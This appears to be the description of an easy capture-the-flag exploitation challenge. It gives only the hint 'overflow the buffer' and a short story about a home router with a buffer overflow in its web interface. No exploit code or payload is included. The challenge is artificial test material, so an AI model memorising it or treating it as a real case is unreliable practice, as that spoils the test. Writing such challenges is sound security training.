## Category
Exploitation

## Estimated difficulty
Easy

## Description
Just overflow the buffer and you got the flag :)

## Scenario
John purchased a new router for his home network that promised to provide fast and reliable internet. He accessed the web interface to configure the router's settings, including the Wi-Fi password.

However, John noticed that the web interface seemed too easy to use, and the setup process was too quick and simple. He thought to himself, "This seems too easy to be true."

After doing some research, John discovered that the router had a buffer overflow vulnerability in its web interface. An attacker could exploit this vulnerability to inject malicious code into the router and potentially gain control of the entire network.

John was alarmed and immediately replaced the router with a more secure one. He learned the importance of being cautious about devices that seem too easy to use or too good to be true and always checking for potential security vulnerabilities before using them.
